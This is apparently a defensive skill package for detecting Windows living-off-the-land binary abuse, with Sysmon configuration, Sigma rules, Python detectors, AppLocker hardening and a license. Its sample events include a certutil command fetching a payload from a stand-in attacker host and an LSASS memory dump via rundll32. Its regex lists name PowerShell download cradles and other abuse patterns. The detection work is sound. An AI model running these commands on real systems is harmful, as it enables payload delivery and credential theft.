- Investigating alerts where legitimate system binaries appear in unexpected execution contexts
- Threat hunting across endpoint telemetry for fileless attack indicators
- Hardening application whitelisting policies (AppLocker, WDAC) to restrict dangerous LOLBin usage
- Creating Sysmon configurations tuned to capture LOLBin-related process creation events
- Responding to incidents where adversaries bypassed AV by using only built-in OS tools

**Do not use** for blocking all LOLBin execution outright; these are legitimate system tools with valid administrative uses. Detection must focus on anomalous context (parent process, command-line arguments, network activity) rather than binary presence alone.

## Prerequisites

- Sysmon v15+ installed on Windows endpoints with a tuned configuration (SwiftOnSecurity or Olaf Hartong baseline)
- SIEM platform ingesting Sysmon Event IDs 1 (Process Create), 3 (Network Connection), 7 (Image Loaded), 11 (File Create)
- Windows Event Log forwarding for Security Event IDs 4688 (Process Creation with command-line logging enabled)
- LOLBAS project reference: https://lolbas-project.github.io/
- Python 3.8+ with `evtx`, `pandas` for offline log analysis
- Sigma rule repository for cross-platform detection rule authoring

## Workflow

### Step 1: Deploy a LOLBin-Focused Sysmon Configuration

Create a Sysmon config that captures the process creation and network events needed for LOLBin detection:

```xml
<!-- File: sysmon-lolbin-detection.xml -->
<Sysmon schemaversion="4.90">
  <EventFiltering>
    <!-- Process Creation: capture all LOLBin executions with full command lines -->
    <RuleGroup name="LOLBin Process Creation" groupRelation="or">
      <ProcessCreate onmatch="include">
        <Image condition="end with">certutil.exe</Image>
        <Image condition="end with">mshta.exe</Image>
        <Image condition="end with">rundll32.exe</Image>
        <Image condition="end with">regsvr32.exe</Image>
        <Image condition="end with">msbuild.exe</Image>
        <Image condition="end with">installutil.exe</Image>
        <Image condition="end with">cmstp.exe</Image>
        <Image condition="end with">wmic.exe</Image>
        <Image condition="end with">bitsadmin.exe</Image>
        <Image condition="end with">certreq.exe</Image>
        <Image condition="end with">esentutl.exe</Image>
        <Image condition="end with">expand.exe</Image>
        <Image condition="end with">extrac32.exe</Image>
        <Image condition="end with">findstr.exe</Image>
        <Image condition="end with">hh.exe</Image>
        <Image condition="end with">ie4uinit.exe</Image>
        <Image condition="end with">mavinject.exe</Image>
        <Image condition="end with">msiexec.exe</Image>
        <Image condition="end with">odbcconf.exe</Image>
        <Image condition="end with">pcalua.exe</Image>
        <Image condition="end with">presentationhost.exe</Image>
        <Image condition="end with">replace.exe</Image>
        <Image condition="end with">xwizard.exe</Image>
        <!-- PowerShell variants -->
        <Image condition="end with">powershell.exe</Image>
        <Image condition="end with">pwsh.exe</Image>
        <!-- Script hosts -->
        <Image condition="end with">cscript.exe</Image>
        <Image condition="end with">wscript.exe</Image>
      </ProcessCreate>
    </RuleGroup>

    <!-- Network connections from LOLBins (highly suspicious) -->
    <RuleGroup name="LOLBin Network" groupRelation="or">
      <NetworkConnect onmatch="include">
        <Image condition="end with">certutil.exe</Image>
        <Image condition="end with">mshta.exe</Image>
        <Image condition="end with">rundll32.exe</Image>
        <Image condition="end with">regsvr32.exe</Image>
        <Image condition="end with">msbuild.exe</Image>
        <Image condition="end with">bitsadmin.exe</Image>
        <Image condition="end with">expand.exe</Image>
        <Image condition="end with">esentutl.exe</Image>
        <Image condition="end with">replace.exe</Image>
      </NetworkConnect>
    </RuleGroup>
  </EventFiltering>
</Sysmon>
```

```powershell
# Install or update Sysmon with the LOLBin config
sysmon64.exe -accepteula -i sysmon-lolbin-detection.xml

# Update existing Sysmon installation
sysmon64.exe -c sysmon-lolbin-detection.xml
```

### Step 2: Build Sigma Detection Rules for Key LOLBins

Write Sigma rules that detect specific abuse patterns, translatable to any SIEM:

```yaml
# File: sigma/certutil_download.yml
title: Certutil Used to Download File
id: a1b2c3d4-5678-9abc-def0-123456789abc
status: stable
description: >
  Detects certutil.exe being used to download files from remote URLs,
  a common LOLBin technique for payload delivery (LOLBAS T1105).
references:
  - https://lolbas-project.github.io/lolbas/Binaries/Certutil/
  - https://attack.mitre.org/techniques/T1105/
author: Threat Detection Team
date: 2026/01/20
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\certutil.exe'
    CommandLine|contains|all:
      - 'urlcache'
      - '-f'
      - 'http'
  condition: selection
falsepositives:
  - Legitimate certificate enrollment using certutil with URL parameters
level: high
tags:
  - attack.defense_evasion
  - attack.t1218
  - attack.command_and_control
  - attack.t1105
```

```yaml
# File: sigma/mshta_execution.yml
title: MSHTA Executing Remote or Inline Script
id: b2c3d4e5-6789-abcd-ef01-234567890bcd
status: stable
description: >
  Detects mshta.exe executing scripts from URLs or inline VBScript/JavaScript,
  commonly used for application whitelisting bypass and initial access.
references:
  - https://lolbas-project.github.io/lolbas/Binaries/Mshta/
  - https://attack.mitre.org/techniques/T1218/005/
logsource:
  category: process_creation
  product: windows
detection:
  selection_remote:
    Image|endswith: '\mshta.exe'
    CommandLine|contains: 'http'
  selection_inline:
    Image|endswith: '\mshta.exe'
    CommandLine|contains:
      - 'vbscript:'
      - 'javascript:'
  selection_parent_anomaly:
    Image|endswith: '\mshta.exe'
    ParentImage|endswith:
      - '\winword.exe'
      - '\excel.exe'
      - '\outlook.exe'
      - '\powerpnt.exe'
  condition: selection_remote or selection_inline or selection_parent_anomaly
falsepositives:
  - Legacy HTA-based internal applications
level: high
```

```yaml
# File: sigma/regsvr32_scrobj.yml
title: Regsvr32 Squiblydoo Scriptlet Execution
id: c3d4e5f6-7890-bcde-f012-345678901cde
status: stable
description: >
  Detects regsvr32.exe loading scrobj.dll with a remote scriptlet URL,
  known as the Squiblydoo technique for AppLocker bypass.
references:
  - https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/
  - https://attack.mitre.org/techniques/T1218/010/
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\regsvr32.exe'
    CommandLine|contains|all:
      - 'scrobj.dll'
      - '/i:'
  condition: selection
falsepositives:
  - Legitimate COM scriptlet registration (rare in modern environments)
level: critical
```

### Step 3: Analyze Sysmon Logs for LOLBin Abuse Patterns

Parse and correlate Sysmon events to identify suspicious LOLBin execution:

```python
import json
import re
from datetime import datetime, timedelta
from collections import defaultdict
from pathlib import Path

# Known LOLBins and their suspicious command-line indicators
LOLBIN_SIGNATURES = {
    "certutil.exe": {
        "suspicious_args": [
            r"-urlcache\s+-f\s+http",
            r"-decode\s+",
            r"-encode\s+",
            r"-verifyctl\s+.*http",
        ],
        "mitre": "T1218, T1105",
        "severity": "high"
    },
    "mshta.exe": {
        "suspicious_args": [
            r"https?://",
            r"vbscript:",
            r"javascript:",
            r"about:",
        ],
        "mitre": "T1218.005",
        "severity": "high"
    },
    "rundll32.exe": {
        "suspicious_args": [
            r"javascript:",
            r"shell32\.dll.*ShellExec_RunDLL",
            r"\\\\.*\\.*\.dll",  # UNC path DLL loading
            r"comsvcs\.dll.*MiniDump",  # LSASS dump via comsvcs
        ],
        "mitre": "T1218.011",
        "severity": "critical"
    },
    "regsvr32.exe": {
        "suspicious_args": [
            r"/s\s+/n\s+/u\s+/i:",
            r"scrobj\.dll",
            r"https?://",
        ],
        "mitre": "T1218.010",
        "severity": "critical"
    },
    "bitsadmin.exe": {
        "suspicious_args": [
            r"/transfer\s+.*https?://",
            r"/create\s+.*\/addfile\s+.*https?://",
            r"/SetNotifyCmdLine",
        ],
        "mitre": "T1197",
        "severity": "high"
    },
    "wmic.exe": {
        "suspicious_args": [
            r"process\s+call\s+create",
            r"/node:",
            r"os\s+get\s+/format:.*https?://",
            r"xsl.*https?://",
        ],
        "mitre": "T1047",
        "severity": "high"
    },
    "msbuild.exe": {
        "suspicious_args": [
            r"\.xml\b",
            r"\.csproj\b",
            r"\\temp\\",
            r"\\appdata\\",
        ],
        "mitre": "T1127.001",
        "severity": "high"
    },
    "mavinject.exe": {
        "suspicious_args": [
            r"/INJECTRUNNING\s+\d+",
        ],
        "mitre": "T1218.013",
        "severity": "critical"
    },
}

def analyze_sysmon_events(events):
    """Analyze Sysmon process creation events for LOLBin abuse."""
    alerts = []

    for event in events:
        image = event.get("Image", "").lower()
        cmdline = event.get("CommandLine", "")
        parent = event.get("ParentImage", "")

        # Check if the process is a known LOLBin
        for lolbin, config in LOLBIN_SIGNATURES.items():
            if image.endswith(lolbin.lower()):
                for pattern in config["suspicious_args"]:
                    if re.search(pattern, cmdline, re.IGNORECASE):
                        alert = {
                            "timestamp": event.get("UtcTime", ""),
                            "hostname": event.get("Computer", ""),
                            "lolbin": lolbin,
                            "command_line": cmdline,
                            "parent_process": parent,
                            "user": event.get("User", ""),
                            "process_id": event.get("ProcessId", ""),
                            "parent_pid": event.get("ParentProcessId", ""),
                            "mitre_technique": config["mitre"],
                            "severity": config["severity"],
                            "matched_pattern": pattern,
                        }
                        alerts.append(alert)
                        break
    return alerts

# Example usage with parsed Sysmon events
sample_events = [
    {
        "UtcTime": "2026-01-20 14:32:15.000",
        "Computer": "WORKSTATION-01",
        "Image": "C:\\Windows\\System32\\certutil.exe",
        "CommandLine": "certutil.exe -urlcache -f http://evil.example.com/payload.exe C:\\temp\\update.exe",
        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
        "User": "CORP\\jsmith",
        "ProcessId": "4532",
        "ParentProcessId": "2108",
    },
    {
        "UtcTime": "2026-01-20 14:33:01.000",
        "Computer": "WORKSTATION-01",
        "Image": "C:\\Windows\\System32\\rundll32.exe",
        "CommandLine": "rundll32.exe comsvcs.dll, MiniDump 624 C:\\temp\\dump.bin full",
        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
        "User": "CORP\\jsmith",
        "ProcessId": "5128",
        "ParentProcessId": "2108",
    },
]

alerts = analyze_sysmon_events(sample_events)
for alert in alerts:
    print(f"[{alert['severity'].upper()}] {alert['lolbin']} on {alert['hostname']}")
    print(f"  MITRE: {alert['mitre_technique']}")
    print(f"  Command: {alert['command_line'][:120]}")
    print(f"  Parent: {alert['parent_process']}")
    print(f"  User: {alert['user']}")
    print()
```

### Step 4: Detect LOLBin Network Connections

LOLBins making outbound network connections is a strong indicator of malicious use:

```python
def detect_lolbin_network_activity(network_events, process_events):
    """Correlate Sysmon network events (ID 3) with process creation (ID 1)
    to find LOLBins making outbound connections."""

    # LOLBins that should rarely make outbound connections
    NETWORK_SUSPICIOUS = {
        "certutil.exe", "mshta.exe", "rundll32.exe", "regsvr32.exe",
        "msbuild.exe", "installutil.exe", "bitsadmin.exe", "esentutl.exe",
        "expand.exe", "replace.exe", "cmstp.exe", "presentationhost.exe",
    }

    alerts = []
    for event in network_events:
        image = event.get("Image", "").lower()
        binary_name = image.split("\\")[-1] if "\\" in image else image

        if binary_name in NETWORK_SUSPICIOUS:
            dest_ip = event.get("DestinationIp", "")
            dest_port = event.get("DestinationPort", "")

            # Skip localhost and internal DNS
            if dest_ip.startswith("127.") or dest_ip == "::1":
                continue

            alert = {
                "type": "lolbin_network_connection",
                "binary": binary_name,
                "destination_ip": dest_ip,
                "destination_port": dest_port,
                "destination_hostname": event.get("DestinationHostname", ""),
                "source_ip": event.get("SourceIp", ""),
                "user": event.get("User", ""),
                "timestamp": event.get("UtcTime", ""),
                "severity": "critical",
            }
            alerts.append(alert)
            print(f"[CRITICAL] {binary_name} connected to "
                  f"{dest_ip}:{dest_port} ({event.get('DestinationHostname', 'N/A')})")

    return alerts
```

### Step 5: Monitor Anomalous Parent-Child Process Relationships

```python
# Suspicious parent-child relationships indicating LOLBin abuse
SUSPICIOUS_PARENT_CHILD = [
    # Office apps spawning LOLBins (macro execution)
    {"parent": ["winword.exe", "excel.exe", "powerpnt.exe", "outlook.exe"],
     "child": ["cmd.exe", "powershell.exe", "pwsh.exe", "mshta.exe",
               "wscript.exe", "cscript.exe", "certutil.exe"],
     "severity": "critical", "mitre": "T1204.002"},

    # Explorer spawning script interpreters directly
    {"parent": ["explorer.exe"],
     "child": ["mshta.exe", "regsvr32.exe", "msbuild.exe"],
     "severity": "high", "mitre": "T1218"},

    # WMI provider spawning processes (lateral movement)
    {"parent": ["wmiprvse.exe"],
     "child": ["cmd.exe", "powershell.exe", "mshta.exe"],
     "severity": "critical", "mitre": "T1047"},

    # Services spawning unusual children
    {"parent": ["services.exe"],
     "child": ["cmd.exe", "powershell.exe", "mshta.exe", "rundll32.exe"],
     "severity": "high", "mitre": "T1543.003"},
]

def check_parent_child_anomaly(event):
    """Check if a process creation event has a suspicious parent-child pair."""
    parent = event.get("ParentImage", "").split("\\")[-1].lower()
    child = event.get("Image", "").split("\\")[-1].lower()

    for rule in SUSPICIOUS_PARENT_CHILD:
        if parent in rule["parent"] and child in rule["child"]:
            return {
                "alert_type": "suspicious_parent_child",
                "parent": parent,
                "child": child,
                "command_line": event.get("CommandLine", ""),
                "mitre": rule["mitre"],
                "severity": rule["severity"],
                "hostname": event.get("Computer", ""),
                "user": event.get("User", ""),
                "timestamp": event.get("UtcTime", ""),
            }
    return None
```

### Step 6: Implement AppLocker or WDAC Hardening

Restrict unnecessary LOLBin execution with application control policies:

```powershell
# Query current AppLocker policy
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections

# Create AppLocker rules to restrict certutil to admin-only
$rule = New-AppLockerPolicy -RuleType Publisher -RuleNamePrefix "Block" `
    -FileInformation "C:\Windows\System32\certutil.exe" `
    -User "S-1-1-0" -Deny

# Export current policy for backup before applying changes
Get-AppLockerPolicy -Effective -Xml > AppLocker_Backup.xml

# Block specific LOLBins for standard users via GPO script
$lolbins_to_restrict = @(
    "mshta.exe", "cmstp.exe", "msbuild.exe", "installutil.exe",
    "regsvr32.exe", "presentationhost.exe", "ie4uinit.exe",
    "mavinject.exe", "xwizard.exe"
)

foreach ($binary in $lolbins_to_restrict) {
    $path = "C:\Windows\System32\$binary"
    if (Test-Path $path) {
        Write-Output "Restricting: $path"
        # Apply WDAC deny rule via PowerShell
        # In production, use Group Policy or Intune WDAC policies
    }
}
```

## Verification

- Confirm Sysmon is logging Event ID 1 (Process Creation) with full command-line arguments for all listed LOLBins
- Validate Sigma rules convert correctly to your SIEM query language using `sigmac` or `sigma-cli`
- Test detection by executing benign LOLBin commands in a lab environment and confirming alerts fire
- Verify parent-child anomaly detection catches Office-to-LOLBin chains (e.g., `winword.exe` spawning `certutil.exe`)
- Confirm LOLBin network connection detection triggers when `certutil.exe` or `mshta.exe` reach out to external IPs
- Check that AppLocker or WDAC policies do not break legitimate administrative workflows before deploying to production
- Validate false positive rates by running detection rules against 7 days of baseline telemetry from a clean environment
- Cross-reference detections against the LOLBAS project database at https://lolbas-project.github.io/ for completeness

===== END FILE =====


===== FILE: skills/detecting-living-off-the-land-attacks/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/detecting-living-off-the-land-attacks/references/api-reference.md =====
# API Reference: Detecting Living Off the Land Attacks

## CLI Usage

```bash
# Analyze Sysmon EVTX file
python agent.py sysmon-events.evtx

# Analyze Sysmon JSON/JSONL export (one event per line)
python agent.py sysmon-events.jsonl

# Filter output for critical alerts
python agent.py sysmon-events.evtx 2>/dev/null | grep CRITICAL
```

## LOLBins Detected

| Binary | MITRE Technique | Severity | Abuse Type |
|--------|----------------|----------|------------|
| certutil.exe | T1218, T1105, T1140 | high | Download, decode, encode |
| mshta.exe | T1218.005 | high | Remote/inline script execution |
| rundll32.exe | T1218.011 | critical | JS execution, LSASS dump, DLL loading |
| regsvr32.exe | T1218.010 | critical | Squiblydoo scriptlet execution |
| bitsadmin.exe | T1197, T1105 | high | BITS download, job notification |
| wmic.exe | T1047 | high | Remote process creation, XSL processing |
| msbuild.exe | T1127.001 | high | Inline task execution from temp/AppData |
| installutil.exe | T1218.004 | high | Silent uninstall execution |
| cmstp.exe | T1218.003 | high | INF-based execution |
| mavinject.exe | T1218.013 | critical | DLL injection into running process |
| cscript.exe | T1059.005 | medium | Remote/suspicious script execution |
| wscript.exe | T1059.005 | medium | Remote/suspicious script execution |

## Suspicious Parent-Child Pairs Detected

| Parent Process | Child Process | MITRE | Severity |
|---------------|--------------|-------|----------|
| winword/excel/outlook | cmd/powershell/mshta/certutil | T1204.002 | critical |
| wmiprvse.exe | cmd/powershell/mshta/rundll32 | T1047 | critical |
| services.exe | cmd/powershell/mshta/rundll32 | T1543.003 | high |
| svchost.exe | mshta/regsvr32/msbuild/certutil | T1218 | high |

## Network-Suspicious LOLBins

LOLBins making outbound network connections are flagged as CRITICAL:

certutil.exe, mshta.exe, rundll32.exe, regsvr32.exe, msbuild.exe,
installutil.exe, bitsadmin.exe, esentutl.exe, expand.exe, replace.exe, cmstp.exe

## Input Formats

### JSON Events Format

```json
[
  {
    "Image": "C:\\Windows\\System32\\certutil.exe",
    "CommandLine": "certutil -urlcache -f http://evil.com/payload.exe C:\\temp\\p.exe",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "User": "CORP\\jsmith",
    "UtcTime": "2026-03-19 14:32:15.000",
    "Computer": "WORKSTATION-01"
  }
]
```

### EVTX Requirements

Sysmon EVTX files with:
- Event ID 1 (Process Creation) with full command-line logging
- Event ID 3 (Network Connection) for LOLBin network detection

## Report Output Schema

```json
{
  "report_date": "2026-03-19T12:00:00+00:00",
  "total_findings": 15,
  "by_severity": {"critical": 3, "high": 8, "medium": 4},
  "by_lolbin": {"certutil.exe": 5, "rundll32.exe": 3, "mshta.exe": 2},
  "mitre_techniques_observed": ["T1047", "T1105", "T1218", "T1218.005", "T1218.011"],
  "findings": []
}
```

## References

- LOLBAS Project: https://lolbas-project.github.io/
- MITRE ATT&CK Defense Evasion: https://attack.mitre.org/tactics/TA0005/
- Sysmon Documentation: https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon
- Sigma LOLBin Rules: https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation

===== END FILE =====


===== FILE: skills/detecting-living-off-the-land-attacks/scripts/agent.py =====
#!/usr/bin/env python3
"""LOLBin (Living Off the Land Binary) detection agent.

Parses Windows Sysmon Event ID 1 (Process Create) and Event ID 3
(Network Connection) logs in EVTX or JSON format to detect suspicious
LOLBin execution patterns, anomalous parent-child relationships, and
LOLBin network activity.
"""

import json
import os
import re
import sys
import xml.etree.ElementTree as ET
from collections import defaultdict
from datetime import datetime

try:
    import Evtx.Evtx as evtx
    HAS_EVTX = True
except ImportError:
    HAS_EVTX = False


# LOLBin signatures: binary name -> suspicious command-line patterns + MITRE mapping
LOLBIN_SIGNATURES = {
    "certutil.exe": {
        "patterns": [
            r"-urlcache\s+-f\s+https?://",
            r"-decode\s+",
            r"-encode\s+",
            r"-verifyctl\s+.*https?://",
            r"-ping\s+https?://",
        ],
        "mitre": ["T1218", "T1105"],
        "severity": "high",
        "description": "Certificate utility used for file download/decode",
    },
    "mshta.exe": {
        "patterns": [
            r"https?://",
            r"vbscript:",
            r"javascript:",
            r"about:",
        ],
        "mitre": ["T1218.005"],
        "severity": "high",
        "description": "HTML Application host executing remote/inline scripts",
    },
    "rundll32.exe": {
        "patterns": [
            r"javascript:",
            r"shell32\.dll.*ShellExec_RunDLL",
            r"\\\\.*\\.*\.dll",
            r"comsvcs\.dll.*MiniDump",
            r"comsvcs\.dll.*#24",
            r"url\.dll.*OpenURL",
            r"url\.dll.*FileProtocolHandler",
            r"advpack\.dll.*RegisterOCX",
        ],
        "mitre": ["T1218.011"],
        "severity": "critical",
        "description": "DLL proxy execution via rundll32",
    },
    "regsvr32.exe": {
        "patterns": [
            r"/s\s+/n\s+/u\s+/i:",
            r"scrobj\.dll",
            r"https?://",
        ],
        "mitre": ["T1218.010"],
        "severity": "critical",
        "description": "Squiblydoo scriptlet execution via regsvr32",
    },
    "bitsadmin.exe": {
        "patterns": [
            r"/transfer\s+.*https?://",
            r"/create\s+",
            r"/addfile\s+.*https?://",
            r"/SetNotifyCmdLine",
            r"/Resume",
        ],
        "mitre": ["T1197"],
        "severity": "high",
        "description": "BITS job abuse for file download/persistence",
    },
    "wmic.exe": {
        "patterns": [
            r"process\s+call\s+create",
            r"/node:",
            r"os\s+get\s+/format:.*https?://",
            r"/format:.*\.xsl",
        ],
        "mitre": ["T1047"],
        "severity": "high",
        "description": "WMI command-line for remote execution or XSL script",
    },
    "msbuild.exe": {
        "patterns": [
            r"\.xml\b",
            r"\.csproj\b",
            r"\\temp\\",
            r"\\appdata\\",
            r"\\users\\.*\\desktop\\",
        ],
        "mitre": ["T1127.001"],
        "severity": "high",
        "description": "MSBuild executing project from unusual location",
    },
    "installutil.exe": {
        "patterns": [
            r"/logfile=",
            r"/LogToConsole=false",
            r"\\temp\\",
            r"\\appdata\\",
        ],
        "mitre": ["T1218.004"],
        "severity": "high",
        "description": "InstallUtil executing assembly from unusual path",
    },
    "cmstp.exe": {
        "patterns": [
            r"/ni\s+/s\s+",
            r"\.inf\b",
        ],
        "mitre": ["T1218.003"],
        "severity": "high",
        "description": "CMSTP INF file execution for UAC bypass",
    },
    "mavinject.exe": {
        "patterns": [
            r"/INJECTRUNNING\s+\d+",
        ],
        "mitre": ["T1218.013"],
        "severity": "critical",
        "description": "DLL injection via mavinject",
    },
    "powershell.exe": {
        "patterns": [
            r"-e(nc|ncodedcommand)?\s+[A-Za-z0-9+/=]{40,}",
            r"IEX\s*\(",
            r"Invoke-Expression",
            r"Net\.WebClient",
            r"DownloadString",
            r"DownloadFile",
            r"-nop\s+-w\s+hidden",
            r"FromBase64String",
        ],
        "mitre": ["T1059.001"],
        "severity": "high",
        "description": "PowerShell executing encoded/download commands",
    },
    "pwsh.exe": {
        "patterns": [
            r"-e(nc|ncodedcommand)?\s+[A-Za-z0-9+/=]{40,}",
            r"IEX\s*\(",
            r"Invoke-Expression",
            r"DownloadString",
        ],
        "mitre": ["T1059.001"],
        "severity": "high",
        "description": "PowerShell Core executing encoded/download commands",
    },
    "cscript.exe": {
        "patterns": [
            r"https?://",
            r"\\temp\\",
            r"\\appdata\\",
        ],
        "mitre": ["T1059.005"],
        "severity": "medium",
        "description": "Console script host executing from unusual location",
    },
    "wscript.exe": {
        "patterns": [
            r"https?://",
            r"\\temp\\",
            r"\\appdata\\",
        ],
        "mitre": ["T1059.005"],
        "severity": "medium",
        "description": "Windows script host executing from unusual location",
    },
}

# Suspicious parent-child process relationships
PARENT_CHILD_RULES = [
    {
        "parents": ["winword.exe", "excel.exe", "powerpnt.exe", "outlook.exe",
                     "msaccess.exe", "mspub.exe", "visio.exe", "onenote.exe"],
        "children": ["cmd.exe", "powershell.exe", "pwsh.exe", "mshta.exe",
                      "wscript.exe", "cscript.exe", "certutil.exe", "regsvr32.exe",
                      "rundll32.exe", "bitsadmin.exe"],
        "severity": "critical",
        "mitre": "T1204.002",
        "description": "Office application spawned command interpreter or LOLBin",
    },
    {
        "parents": ["wmiprvse.exe"],
        "children": ["cmd.exe", "powershell.exe", "pwsh.exe", "mshta.exe",
                      "rundll32.exe"],
        "severity": "critical",
        "mitre": "T1047",
        "description": "WMI Provider Host spawned process (possible remote WMI execution)",
    },
    {
        "parents": ["svchost.exe"],
        "children": ["cmd.exe", "powershell.exe", "mshta.exe", "certutil.exe"],
